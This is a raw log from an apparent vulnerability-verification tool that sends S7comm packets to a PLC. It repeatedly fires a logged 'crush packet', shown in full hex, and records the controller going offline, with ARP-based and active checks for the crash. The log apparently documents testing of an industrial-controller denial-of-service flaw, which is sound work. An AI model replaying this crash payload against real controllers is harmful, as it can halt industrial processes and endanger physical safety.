[2021-12-19 20:29:49,795] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:29:49,796] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:29:49,968] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-12-19 20:29:49,969] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-12-19 20:29:49,969] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 65
[2021-12-19 20:29:49,971] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-12-19 20:29:50,173] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-12-19 20:29:50,380] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000400000800080001120411440100ff090004001c0000
[2021-12-19 20:29:50,586] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-12-19 20:29:50,793] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-12-19 20:29:50,998] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000700000800080001120411440100ff090004001c0000
[2021-12-19 20:29:51,204] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-12-19 20:29:51,408] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000900000800080001120411440100ff090004001c0000
[2021-12-19 20:29:51,610] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000a00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:51,813] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000b00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:52,018] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000c00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:52,225] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000d00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:52,430] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000e00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:52,633] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000f00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:52,842] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001000000800080001120411440100ff090004001c0000
[2021-12-19 20:29:53,046] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001100000800080001120411440100ff090004001c0000
[2021-12-19 20:29:53,264] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001200000800080001120411440100ff090004001c0000
[2021-12-19 20:29:53,469] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001300000800080001120411440100ff090004001c0000
[2021-12-19 20:29:53,673] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001400000800080001120411440100ff090004001c0000
[2021-12-19 20:29:53,876] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001500000800080001120411440100ff090004001c0000
[2021-12-19 20:29:54,080] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001600000800080001120411440100ff090004001c0000
[2021-12-19 20:29:54,287] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001700000800080001120411440100ff090004001c0000
[2021-12-19 20:29:54,493] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001800000800080001120411440100ff090004001c0000
[2021-12-19 20:29:54,696] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001900000800080001120411440100ff090004001c0000
[2021-12-19 20:29:54,899] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001a00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:55,117] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001b00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:55,322] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001c00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:55,527] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001d00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:55,729] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001e00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:55,934] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001f00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:56,142] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002000000800080001120411440100ff090004001c0000
[2021-12-19 20:29:56,349] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002100000800080001120411440100ff090004001c0000
[2021-12-19 20:29:56,552] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002200000800080001120411440100ff090004001c0000
[2021-12-19 20:29:56,755] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002300000800080001120411440100ff090004001c0000
[2021-12-19 20:29:56,962] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002400000800080001120411440100ff090004001c0000
[2021-12-19 20:29:57,164] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002500000800080001120411440100ff090004001c0000
[2021-12-19 20:29:57,369] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002600000800080001120411440100ff090004001c0000
[2021-12-19 20:29:57,574] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002700000800080001120411440100ff090004001c0000
[2021-12-19 20:29:57,790] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002800000800080001120411440100ff090004001c0000
[2021-12-19 20:29:57,996] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002900000800080001120411440100ff090004001c0000
[2021-12-19 20:29:58,202] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002a00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:58,408] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002b00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:58,615] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002c00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:58,821] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002d00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:59,027] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002e00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:59,228] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002f00000800080001120411440100ff090004001c0000
[2021-12-19 20:29:59,434] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003000000800080001120411440100ff090004001c0000
[2021-12-19 20:29:59,639] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003100000800080001120411440100ff090004001c0000
[2021-12-19 20:29:59,857] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003200000800080001120411440100ff090004001c0000
[2021-12-19 20:30:00,060] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003300000800080001120411440100ff090004001c0000
[2021-12-19 20:30:00,264] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003400000800080001120411440100ff090004001c0000
[2021-12-19 20:30:00,469] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003500000800080001120411440100ff090004001c0000
[2021-12-19 20:30:00,683] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003600000800080001120411440100ff090004001c0000
[2021-12-19 20:30:00,892] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003700000800080001120411440100ff090004001c0000
[2021-12-19 20:30:01,107] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003800000800080001120411440100ff090004001c0000
[2021-12-19 20:30:01,326] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003900000800080001120411440100ff090004001c0000
[2021-12-19 20:30:01,531] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003a00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:01,734] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003b00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:01,937] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003c00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:02,155] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003d00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:02,370] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003e00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:02,586] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003f00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:02,792] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004000000800080001120411440100ff090004001c0000
[2021-12-19 20:30:02,995] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004100000800080001120411440100ff090004001c0000
[2021-12-19 20:30:03,201] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004200000800080001120411440100ff090004001c0000
[2021-12-19 20:30:03,764] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:30:03,765] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100004300000e00000401120a10010003000083000001
[2021-12-19 20:30:03,971] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004400000800080001120411440100ff090004001c0000
[2021-12-19 20:30:04,175] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004500000800080001120411440100ff090004001c0000
[2021-12-19 20:30:04,378] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004600000800080001120411440100ff090004001c0000
[2021-12-19 20:30:04,584] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004700000800080001120411440100ff090004001c0000
[2021-12-19 20:30:04,789] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004800000800080001120411440100ff090004001c0000
[2021-12-19 20:30:04,995] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004900000800080001120411440100ff090004001c0000
[2021-12-19 20:30:05,197] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004a00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:05,404] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004b00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:05,607] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004c00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:05,811] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004d00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:06,018] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004e00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:06,221] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004f00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:06,425] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005000000800080001120411440100ff090004001c0000
[2021-12-19 20:30:06,629] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005100000800080001120411440100ff090004001c0000
[2021-12-19 20:30:06,835] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005200000800080001120411440100ff090004001c0000
[2021-12-19 20:30:07,041] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005300000800080001120411440100ff090004001c0000
[2021-12-19 20:30:07,245] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005400000800080001120411440100ff090004001c0000
[2021-12-19 20:30:07,452] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005500000800080001120411440100ff090004001c0000
[2021-12-19 20:30:07,656] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005600000800080001120411440100ff090004001c0000
[2021-12-19 20:30:07,859] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005700000800080001120411440100ff090004001c0000
[2021-12-19 20:30:08,077] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005800000800080001120411440100ff090004001c0000
[2021-12-19 20:30:08,282] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005900000800080001120411440100ff090004001c0000
[2021-12-19 20:30:08,487] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005a00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:08,692] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005b00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:08,898] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005c00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:09,105] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005d00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:09,312] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005e00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:09,517] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005f00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:09,720] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006000000800080001120411440100ff090004001c0000
[2021-12-19 20:30:09,926] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006100000800080001120411440100ff090004001c0000
[2021-12-19 20:30:10,131] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006200000800080001120411440100ff090004001c0000
[2021-12-19 20:30:10,336] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006300000800080001120411440100ff090004001c0000
[2021-12-19 20:30:10,542] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006400000800080001120411440100ff090004001c0000
[2021-12-19 20:30:10,747] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006500000800080001120411440100ff090004001c0000
[2021-12-19 20:30:10,955] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006600000800080001120411440100ff090004001c0000
[2021-12-19 20:30:11,162] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006700000800080001120411440100ff090004001c0000
[2021-12-19 20:30:11,368] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006800000800080001120411440100ff090004001c0000
[2021-12-19 20:30:11,572] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006900000800080001120411440100ff090004001c0000
[2021-12-19 20:30:11,773] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006a00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:11,977] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006b00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:12,182] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006c00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:12,228] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:30:12,386] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:30:24,427] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:30:24,427] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 107 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:30:29,756] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:30:31,837] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f080320100006d0000080000f000000a000a00f0
[2021-12-19 20:30:31,838] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300006d00000800000000f0000003000300f0
[2021-12-19 20:30:33,845] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 15
[2021-12-19 20:30:33,850] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006e00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:34,062] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:30:34,070] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:30:34,071] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 1 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:30:34,072] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:30:34,074] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006f00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:34,282] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007000000800080001120411440100ff090004001c0000
[2021-12-19 20:30:34,488] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007100000800080001120411440100ff090004001c0000
[2021-12-19 20:30:34,693] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007200000800080001120411440100ff090004001c0000
[2021-12-19 20:30:34,897] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007300000800080001120411440100ff090004001c0000
[2021-12-19 20:30:35,104] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007400000800080001120411440100ff090004001c0000
[2021-12-19 20:30:35,317] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007500000800080001120411440100ff090004001c0000
[2021-12-19 20:30:35,525] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007600000800080001120411440100ff090004001c0000
[2021-12-19 20:30:35,728] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007700000800080001120411440100ff090004001c0000
[2021-12-19 20:30:35,935] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007800000800080001120411440100ff090004001c0000
[2021-12-19 20:30:36,137] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007900000800080001120411440100ff090004001c0000
[2021-12-19 20:30:36,345] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007a00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:36,550] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007b00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:36,755] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007c00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:37,678] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:30:37,679] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100007d00000e00000401120a10010003000083000001
[2021-12-19 20:30:37,891] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007e00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:38,094] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007f00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:38,301] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008000000800080001120411440100ff090004001c0000
[2021-12-19 20:30:38,509] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008100000800080001120411440100ff090004001c0000
[2021-12-19 20:30:38,714] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008200000800080001120411440100ff090004001c0000
[2021-12-19 20:30:38,918] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008300000800080001120411440100ff090004001c0000
[2021-12-19 20:30:39,124] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008400000800080001120411440100ff090004001c0000
[2021-12-19 20:30:39,329] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008500000800080001120411440100ff090004001c0000
[2021-12-19 20:30:39,534] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008600000800080001120411440100ff090004001c0000
[2021-12-19 20:30:39,741] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008700000800080001120411440100ff090004001c0000
[2021-12-19 20:30:39,943] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008800000800080001120411440100ff090004001c0000
[2021-12-19 20:30:40,148] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008900000800080001120411440100ff090004001c0000
[2021-12-19 20:30:40,351] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008a00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:40,558] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008b00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:40,764] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008c00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:40,971] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008d00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:41,179] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008e00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:41,384] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008f00000800080001120411440100ff090004001c0000
[2021-12-19 20:30:41,591] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009000000800080001120411440100ff090004001c0000
[2021-12-19 20:30:41,798] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009100000800080001120411440100ff090004001c0000
[2021-12-19 20:30:42,004] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009200000800080001120411440100ff090004001c0000
[2021-12-19 20:30:42,208] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009300000800080001120411440100ff090004001c0000
[2021-12-19 20:30:42,223] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:30:42,410] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:30:54,459] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:30:54,460] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 38 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:30:59,725] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:31:01,850] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000940000080000f000000a000a00f0
[2021-12-19 20:31:01,852] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300009400000800000000f0000003000300f0
[2021-12-19 20:31:03,855] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 28
[2021-12-19 20:31:03,863] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009500000800080001120411440100ff090004001c0000
[2021-12-19 20:31:04,075] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:31:04,091] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:31:04,091] [INFO] [vertifyPassiveARP.<module>] -> No: 3, sended packets 1 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:31:04,092] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:31:04,096] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009600000800080001120411440100ff090004001c0000
[2021-12-19 20:31:04,312] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009700000800080001120411440100ff090004001c0000
[2021-12-19 20:31:04,529] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009800000800080001120411440100ff090004001c0000
[2021-12-19 20:31:04,737] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009900000800080001120411440100ff090004001c0000
[2021-12-19 20:31:04,951] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009a00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:05,158] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009b00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:05,374] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009c00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:05,576] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009d00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:05,779] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009e00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:05,985] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009f00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:06,201] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a000000800080001120411440100ff090004001c0000
[2021-12-19 20:31:06,408] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a100000800080001120411440100ff090004001c0000
[2021-12-19 20:31:06,616] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a200000800080001120411440100ff090004001c0000
[2021-12-19 20:31:06,819] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a300000800080001120411440100ff090004001c0000
[2021-12-19 20:31:07,025] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a400000800080001120411440100ff090004001c0000
[2021-12-19 20:31:07,230] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a500000800080001120411440100ff090004001c0000
[2021-12-19 20:31:07,435] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a600000800080001120411440100ff090004001c0000
[2021-12-19 20:31:07,639] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a700000800080001120411440100ff090004001c0000
[2021-12-19 20:31:07,844] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a800000800080001120411440100ff090004001c0000
[2021-12-19 20:31:08,047] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a900000800080001120411440100ff090004001c0000
[2021-12-19 20:31:08,254] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000aa00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:08,471] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ab00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:08,677] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ac00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:08,893] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ad00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:09,096] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ae00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:09,297] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000af00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:09,501] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b000000800080001120411440100ff090004001c0000
[2021-12-19 20:31:09,988] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:31:09,989] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f08032010000b100000e00000401120a10010003000083000001
[2021-12-19 20:31:10,208] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b200000800080001120411440100ff090004001c0000
[2021-12-19 20:31:10,412] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b300000800080001120411440100ff090004001c0000
[2021-12-19 20:31:10,614] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b400000800080001120411440100ff090004001c0000
[2021-12-19 20:31:10,819] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b500000800080001120411440100ff090004001c0000
[2021-12-19 20:31:11,023] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b600000800080001120411440100ff090004001c0000
[2021-12-19 20:31:11,226] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b700000800080001120411440100ff090004001c0000
[2021-12-19 20:31:11,429] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b800000800080001120411440100ff090004001c0000
[2021-12-19 20:31:11,633] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b900000800080001120411440100ff090004001c0000
[2021-12-19 20:31:11,838] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ba00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:12,042] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bb00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:12,245] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bc00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:12,450] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bd00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:12,652] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000be00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:12,858] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bf00000800080001120411440100ff090004001c0000
[2021-12-19 20:31:13,064] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c000000800080001120411440100ff090004001c0000
[2021-12-19 20:31:13,281] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c100000800080001120411440100ff090004001c0000
[2021-12-19 20:31:13,487] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c200000800080001120411440100ff090004001c0000
[2021-12-19 20:31:13,689] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c300000800080001120411440100ff090004001c0000
[2021-12-19 20:31:13,896] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c400000800080001120411440100ff090004001c0000
